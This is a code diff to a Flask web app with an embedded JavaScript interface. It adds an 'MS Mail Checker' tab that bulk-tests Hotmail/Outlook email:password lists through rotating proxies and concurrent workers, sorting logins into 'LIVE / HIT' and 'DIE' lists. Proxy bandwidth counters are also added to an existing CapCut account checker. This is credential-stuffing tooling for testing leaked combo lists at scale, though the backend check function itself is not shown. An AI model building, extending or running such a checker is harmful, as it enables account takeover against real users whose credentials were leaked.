"prx_th_ping": "PING", "prx_th_loc": "IP DE SAÍDA E LOCALIZAÇÃO", "prx_th_isp": "PROVEDOR / ORG", "prx_th_fraud": "RISCO DE FRAUDE", "prx_th_act": "DETALHES", "prx_empty_table": "Nenhum proxy verificado ainda. Insira a lista e clique em <b>Iniciar Checagem</b>.", "prx_no_match": "Nenhum proxy corresponde ao filtro.", "prx_modal_title": "Detalhes de Diagnóstico do Proxy", "prx_modal_close": "Fechar", "prx_alert_empty": "Por favor, insira a lista de proxies!", "prx_no_live_copy": "Nenhum proxy LIVE para copiar.", "prx_no_live_dl": "Nenhum proxy LIVE para baixar.", "nav_menu": "Menu", "tab_hotmail": "MS Mail Checker", "hm_card_title": "MS Mail Checker", "hm_desc": "Check Microsoft account (Hotmail / Outlook / Live) login validity (email:password or email|password) with Country Detection.", "hm_acc_label": "ACCOUNT LIST (email:pass / email|pass)", "hm_acc_ph": "user1@hotmail.com:password123\\nuser2@outlook.com|password456", "hm_use_proxy_label": "Use Proxy (Recommended)", "hm_proxy_label": "PROXY URL (HTTP/SOCKS5)", "hm_threads_label": "THREADS", "hm_timeout_label": "TIMEOUT (s)", "hm_btn_start": "Start Hotmail Check", "hm_btn_stop": "Stop", "hm_results_title": "Hotmail Check Results", "hm_btn_dl_live": "Save LIVE (.txt)", "hm_live_title": "LIVE / HIT", "hm_live_ph": "LIVE accounts (login OK + country) will appear here...", "hm_die_title": "DIE / WRONG PASS", "hm_die_ph": "DIE accounts (wrong pass / not found) will appear here...", "hm_btn_copy": "Copy", "hm_btn_save": "Save", "hm_alert_empty": "Please enter Hotmail/Outlook account list!", "hm_alert_no_valid": "No valid email:pass account format found."}};
     const LANG_META = {
   "id": { "flag": "🇮🇩", "code": "ID", "name": "Bahasa Indonesia" },
   "en": { "flag": "🇬🇧", "code": "EN", "name": "English" },
@@ -2344,6 +2728,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
 
     const TAB_META = {
       mail: { icon: '<i class="fa-solid fa-inbox"></i>', i18n: 'tab_mail' },
+      hotmail: { icon: '<i class="fa-brands fa-microsoft"></i>', i18n: 'tab_hotmail' },
       capcut: { icon: '<i class="fa-solid fa-film"></i>', i18n: 'tab_capcut' },
       '2fa': { icon: '<i class="fa-solid fa-key"></i>', i18n: 'tab_2fa' },
       proxy: { icon: '<i class="fa-solid fa-server"></i>', i18n: 'tab_proxy' }
@@ -2413,7 +2798,6 @@ HTML_TEMPLATE = """<!DOCTYPE html>
     function showToast(msg, icon = 'fa-solid fa-circle-check text-success') {
       const container = document.getElementById('chenToastContainer');
       if (!container) return;
-      // Remove any existing toast immediately so only 1 popup appears
       container.innerHTML = '';
       const toast = document.createElement('div');
       toast.className = 'chen-toast';
@@ -2426,7 +2810,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
     }
     
     window.switchTab = function(tabName) {
-      const allTabs = ['mail', 'capcut', '2fa', 'proxy'];
+      const allTabs = ['mail', 'hotmail', 'capcut', '2fa', 'proxy'];
       allTabs.forEach(name => {
         const btn = document.getElementById('btn-tab-' + name);
         const pane = document.getElementById('tab-' + name);
@@ -2461,6 +2845,237 @@ HTML_TEMPLATE = """<!DOCTYPE html>
     };
     function switchTab(tabName) {
       window.switchTab(tabName);
+    }
+
+    /* ================= HOTMAIL / OUTLOOK CHECKER LOGIC ================= */
+    let hotmailList = [];
+    let hotmailLiveResults = [];
+    let hotmailDieResults = [];
+    let hotmailAbortController = null;
+    let hotmailTotalBytesUsed = 0;
+
+    function formatBytes(bytes) {
+      if (!bytes || bytes === 0) return '0 B';
+      const k = 1024;
+      const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
+      const i = Math.floor(Math.log(bytes) / Math.log(k));
+      return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+    }
+
+    function resetHotmailProxyUsage() {
+      hotmailTotalBytesUsed = 0;
+      const badge = document.getElementById('hotmailProxyUsageBadge');
+      if (badge) badge.textContent = '0 B';
+      showToast('Counter kuota proxy direset.', 'fa-solid fa-rotate-left text-info');
+    }
+
+    function updateHotmailCount() {
+      const input = document.getElementById('hotmailAccountsInput');
+      const lines = (input ? input.value : '').split(String.fromCharCode(10)).map(l => l.trim()).filter(l => l && (l.includes(':') || l.includes('|')));
+      const countEl = document.getElementById('hotmailAccountCount');
+      if (countEl) countEl.textContent = `Total: ${lines.length} akun`;
+    }
+
+    function toggleHotmailProxyField() {
+      const toggle = document.getElementById('useHotmailProxyToggle');
+      const container = document.getElementById('hotmailProxyFieldContainer');
+      if (toggle && container) {
+        container.style.display = toggle.checked ? 'block' : 'none';
+      }
+    }
+
+    function loadSampleHotmail() {
+      const sample = [
+        'sample_user1@hotmail.com:Password123!',
+        'sample_user2@outlook.com|SecretPass456',
+        'sample_user3@live.com:TestPassword789'
+      ].join(String.fromCharCode(10));
+      const input = document.getElementById('hotmailAccountsInput');
+      if (input) {
+        input.value = sample;
+        updateHotmailCount();
+      }
+    }
+
+    function clearHotmailInput() {
+      const input = document.getElementById('hotmailAccountsInput');
+      if (input) {
+        input.value = '';
+        updateHotmailCount();
+      }
+    }
+
+    function updateHotmailProxyCount() {
+      const input = document.getElementById('hotmailProxyInput');
+      const lines = (input ? input.value : '').split(String.fromCharCode(10)).map(l => l.trim()).filter(l => l && !l.startsWith('#'));
+      const lbl = document.getElementById('hotmailProxyCountLabel');
+      if (lbl) lbl.textContent = `Total: ${lines.length} proxy (Rotasi per akun)`;
+    }
+
+    function handleHotmailProxyFileUpload(e) {
+      const file = e.target.files && e.target.files[0];
+      if (!file) return;
+      const reader = new FileReader();
+      reader.onload = function(evt) {
+        const content = evt.target.result || '';
+        const input = document.getElementById('hotmailProxyInput');
+        if (input) {
+          input.value = content.trim();
+          updateHotmailProxyCount();
+          showToast(`Berhasil memuat proxy dari file ${file.name}`, 'fa-solid fa-file-check text-success');
+        }
+      };
+      reader.readAsText(file);
+      e.target.value = '';
+    }
+
+    async function startHotmailChecking() {
+      const rawText = (document.getElementById('hotmailAccountsInput') ? document.getElementById('hotmailAccountsInput').value : '').trim();
+      if (!rawText) return showToast(getI18nText('hm_alert_empty', 'Silakan masukkan list akun Hotmail/Outlook!'), 'fa-solid fa-triangle-exclamation text-warning');
+
+      const lines = rawText.split(String.fromCharCode(10)).map(l => l.trim()).filter(l => l && !l.startsWith('#') && (l.includes(':') || l.includes('|') || l.includes(';')));
+      if (lines.length === 0) return showToast(getI18nText('hm_alert_no_valid', 'Tidak ada baris akun format email:pass yang valid.'), 'fa-solid fa-triangle-exclamation text-warning');
+
+      const concurrency = Math.min(20, Math.max(1, parseInt(document.getElementById('hotmailWorkersInput').value) || 4));
+      const timeout = Math.min(45, Math.max(5, parseInt(document.getElementById('hotmailTimeoutInput').value) || 15));
+      const useProxy = Boolean(document.getElementById('useHotmailProxyToggle') && document.getElementById('useHotmailProxyToggle').checked);
+      
+      let proxyList = [];
+      if (useProxy && document.getElementById('hotmailProxyInput')) {
+        proxyList = document.getElementById('hotmailProxyInput').value
+          .split(String.fromCharCode(10))
+          .map(p => p.trim())
+          .filter(p => p && !p.startsWith('#'));
+      }
+
+      hotmailList = lines;
+      hotmailLiveResults = [];
+      hotmailDieResults = [];
+      hotmailAbortController = new AbortController();
+
+      const liveArea = document.getElementById('hotmailLiveResult');
+      const dieArea = document.getElementById('hotmailDieResult');
+      const liveCnt = document.getElementById('hotmailLiveCount');
+      const dieCnt = document.getElementById('hotmailDieCount');
+      const progBox = document.getElementById('hotmailProgressBox');
+      const progBar = document.getElementById('hotmailProgressBar');
+      const progTxt = document.getElementById('hotmailProgressText');
+      const proxyBadge = document.getElementById('hotmailProxyUsageBadge');
+
+      if (liveArea) liveArea.value = '';
+      if (dieArea) dieArea.value = '';
+      if (liveCnt) liveCnt.textContent = '0';
+      if (dieCnt) dieCnt.textContent = '0';
+      if (progBox) progBox.style.display = 'block';
+      if (progBar) progBar.style.width = '0%';
+      if (progTxt) progTxt.textContent = `0/${lines.length} (0%)`;
+
+      if (document.getElementById('btnStartHotmail')) document.getElementById('btnStartHotmail').disabled = true;
+      if (document.getElementById('btnStopHotmail')) document.getElementById('btnStopHotmail').disabled = false;
+
+      let currentIndex = 0;
+      let completedCount = 0;
+      const total = lines.length;
+
+      async function worker() {
+        while (currentIndex < total) {
+          if (hotmailAbortController && hotmailAbortController.signal.aborted) break;
+          const idx = currentIndex++;
+          const line = lines[idx];
+
+          let email = '';
+          let password = '';
+          const parts = line.split(/[:|;]+/);
+          if (parts.length >= 2) {
+            email = parts[0].trim();
+            password = parts[1].trim();
+          }
+
+          if (!email || !password) {
+            completedCount++;
+            continue;
+          }
+
+          // Pick proxy round-robin if multiple proxies are provided
+          let assignedProxy = null;
+          if (useProxy && proxyList.length > 0) {
+            assignedProxy = proxyList[idx % proxyList.length];
+          }
+
+          try {
+            const res = await safeFetchJson('/api/hotmail/check_single', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                email: email,
+                password: password,
+                proxy: assignedProxy || null,
+                timeout: timeout
+              }),
+              signal: hotmailAbortController ? hotmailAbortController.signal : undefined
+            });
+
+            if (res && res.bytes_used) {
+              hotmailTotalBytesUsed += res.bytes_used;
+              if (proxyBadge) proxyBadge.textContent = formatBytes(hotmailTotalBytesUsed);
+            }
+
+            if (res && res.live) {
+              const liveLine = `${res.email}:${res.password} | ${res.motivo || 'Login OK'}`;
+              hotmailLiveResults.push(liveLine);
+              if (liveArea) {
+                liveArea.value = hotmailLiveResults.join(String.fromCharCode(10));
+                liveArea.scrollTop = liveArea.scrollHeight;
+              }
+              if (liveCnt) liveCnt.textContent = hotmailLiveResults.length;
+            } else {
+              const dieMsg = res && res.motivo ? res.motivo : 'Login failed';
+              const dieLine = `${email}:${password} | ${dieMsg}`;
+              hotmailDieResults.push(dieLine);
+              if (dieArea) {
+                dieArea.value = hotmailDieResults.join(String.fromCharCode(10));
+                dieArea.scrollTop = dieArea.scrollHeight;
+              }
+              if (dieCnt) dieCnt.textContent = hotmailDieResults.length;
+            }
+          } catch (err) {
+            if (hotmailAbortController && hotmailAbortController.signal.aborted) break;
+            const errLine = `${email}:${password} | Error: ${err.message || 'Check failed'}`;
+            hotmailDieResults.push(errLine);
+            if (dieArea) {
+              dieArea.value = hotmailDieResults.join(String.fromCharCode(10));
+            }
+            if (dieCnt) dieCnt.textContent = hotmailDieResults.length;
+          }
+
+          completedCount++;
+          const pct = Math.round((completedCount / total) * 100);
+          if (progBar) progBar.style.width = pct + '%';
+          if (progTxt) progTxt.textContent = `${completedCount}/${total} (${pct}%)`;
+        }
+      }
+
+      const workers = [];
+      for (let w = 0; w < Math.min(concurrency, total); w++) {
+        workers.push(worker());
+      }
+
+      await Promise.all(workers);
+
+      if (document.getElementById('btnStartHotmail')) document.getElementById('btnStartHotmail').disabled = false;
+      if (document.getElementById('btnStopHotmail')) document.getElementById('btnStopHotmail').disabled = true;
+      if (progBar) progBar.style.width = '100%';
+      if (progTxt) progTxt.textContent = `${total}/${total} (100% Selesai)`;
+      showToast(`Pengecekan Hotmail selesai! Live: ${hotmailLiveResults.length}, Die: ${hotmailDieResults.length}`, 'fa-solid fa-circle-check text-success');
+    }
+
+    function stopHotmailChecking() {
+      if (hotmailAbortController) {
+        hotmailAbortController.abort();
+      }
+      if (document.getElementById('btnStartHotmail')) document.getElementById('btnStartHotmail').disabled = false;
+      if (document.getElementById('btnStopHotmail')) document.getElementById('btnStopHotmail').disabled = true;
+      showToast('Pengecekan Hotmail dihentikan.', 'fa-solid fa-hand text-warning');
     }
 
     
@@ -3831,6 +4446,14 @@ HTML_TEMPLATE = """<!DOCTYPE html>
       return exportCapcutResults(format);
     }
 
+    let capcutTotalBytesUsed = 0;
+    function resetCapcutProxyUsage() {
+      capcutTotalBytesUsed = 0;
+      const b = document.getElementById('ccProxyUsageBadge');
+      if (b) b.textContent = '0 B';
+      showToast('Counter kuota proxy CapCut direset.', 'fa-solid fa-rotate-left text-info');
+    }
+
     async function startCapcutChecking() {
       const text = ccAccountsInput.value.trim();
       const proxy = document.getElementById('ccProxyInput').value.trim();
@@ -3851,6 +4474,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
       document.getElementById('btnStartCapcut').disabled = true;
       document.getElementById('btnStopCapcut').disabled = false;
       capcutAbortController = new AbortController();
+      const ccProxyBadge = document.getElementById('ccProxyUsageBadge');
 
       try {
         let accounts = parseCapcutLinesJS(text);
@@ -3892,6 +4516,12 @@ HTML_TEMPLATE = """<!DOCTYPE html>
               });
               checked++;
               capcutRecords.push(r);
+
+              if (r && r.bytes_used) {
+                capcutTotalBytesUsed += r.bytes_used;
+                if (ccProxyBadge) ccProxyBadge.textContent = formatBytes(capcutTotalBytesUsed);
+              }
+
               const uidStr = r.user_id ? ` | UID: ${r.user_id}` : '';
 
               if (r.ok && r.is_pro) {
@@ -4639,6 +5269,8 @@ def index():
             return api_parse_proxies()
         elif action == "2fa_generate" or "secrets" in payload:
             return api_2fa_generate()
+        elif action == "check_single_hotmail" or action == "hotmail_check_single":
+            return api_hotmail_check_single()
         elif action == "parse_accounts" or "mode" in payload:
             return api_parse_accounts()
         elif action == "check_capcut" or "accounts_text" in payload:
@@ -4886,6 +5518,16 @@ def api_2fa_generate():
                 })
 
     return jsonify({"ok": True, "data": results})
+
+@app.route("/api/hotmail/check_single", methods=["POST"])
+def api_hotmail_check_single():
+    payload = request.get_json(force=True) or {}
+    email = payload.get("email", "")
+    password = payload.get("password", "")
+    proxy_url = payload.get("proxy", "") or None
+    timeout = int(payload.get("timeout", 15))
+    res = check_single_hotmail(email, password, proxy_url=proxy_url, timeout=timeout)
+    return jsonify(res)
 
 @app.after_request
 def add_no_cache_headers(response):
